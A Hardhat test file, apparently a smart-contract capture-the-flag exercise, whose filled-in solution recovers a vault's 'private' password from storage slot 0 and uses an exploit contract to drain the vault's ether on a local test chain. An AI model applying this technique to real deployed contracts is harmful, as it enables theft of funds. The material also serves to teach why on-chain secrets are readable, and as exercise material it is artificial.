const { expect } = require('chai')
const { ethers } = require('hardhat')

describe('[PASSWORD VAULT EXPLOIT]', async function () {
    let deployer, attacker

    const VAULT_BALANCE = ethers.utils.parseEther('1')

    before(async function () {
        // SET UP
        ;[deployer, attacker, alice] = await ethers.getSigners()

        this.vault = await (
            await ethers.getContractFactory('PasswordVault', deployer)
        ).deploy(require('./secrets/dont-peek'))

        await deployer.sendTransaction({ to: this.vault.address, value: VAULT_BALANCE })

        expect(
            await ethers.provider.getBalance(this.vault.address)
        ).to.be.equal(VAULT_BALANCE)
    })

    it('Exploit', async function () {
        // YOUR EXPLOIT HERE

        let password = await attacker.provider.getStorageAt(this.vault.address, 0)
        
        let exploit = await (await ethers.getContractFactory('PasswordVaultExploit', deployer)).deploy(this.vault.address)
        
        await exploit.connect(attacker).run(password)
        
    })

    after(async function () {
        // SUCCESS CONDITIONS
        expect(await ethers.provider.getBalance(this.vault.address)).to.be.equal('0')
    })
})
